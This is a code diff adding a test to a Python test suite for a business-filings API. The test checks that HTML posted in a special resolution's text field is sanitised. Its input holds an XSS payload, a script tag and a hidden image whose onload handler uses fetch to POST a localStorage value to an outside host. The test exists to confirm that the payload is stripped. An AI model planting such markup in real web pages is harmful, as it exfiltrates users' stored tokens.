@@ -247,6 +247,28 @@ def test_post_allowed_historical(session, client, jwt):
 
     assert rv.status_code == HTTPStatus.CREATED
 
+def test_special_resolution_sanitation(session, client, jwt):
+    """Assert that script tags can't be passed into special resolution resolution field."""
+    identifier = 'BC7654399'
+    factory_business(identifier, state=Business.State.ACTIVE)
+
+    data = copy.deepcopy(FILING_HEADER)
+    data['filing']['header']['name'] = 'specialResolution'
+    data['filing']['specialResolution'] = copy.deepcopy(SPECIAL_RESOLUTION)
+    data['filing']['specialResolution']['resolution'] = """
+        <p>Hello this is great</p><script>alert("hello")</script>
+        <img
+            src="https://www.google.ca"
+            style="display:none"
+            onload="fetch('https://www.google.ca', {method: 'POST', body: localStorage.getItem('rfdsfds432432423423')})"
+        >
+        """
+    rv = client.post(f'/api/v2/businesses/{identifier}/filings?draft=true',
+                     json=data,
+                     headers=create_header(jwt, [STAFF_ROLE], 'user')
+                     )
+    assert rv.status_code == HTTPStatus.CREATED
+    assert rv.json['filing']['specialResolution']['resolution'] == ' <p>Hello this is great</p> '
 
 def test_post_draft_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
@@ -261,7 +283,6 @@ def test_post_draft_ar(session, client, jwt):
     assert rv.status_code == HTTPStatus.CREATED
     assert not rv.json['filing']['header'].get('paymentToken')
     assert rv.json['filing']['header']['filingId']
-
 
 def test_post_only_validate_ar(session, client, jwt):
     """Assert that a unpaid filing can be posted."""
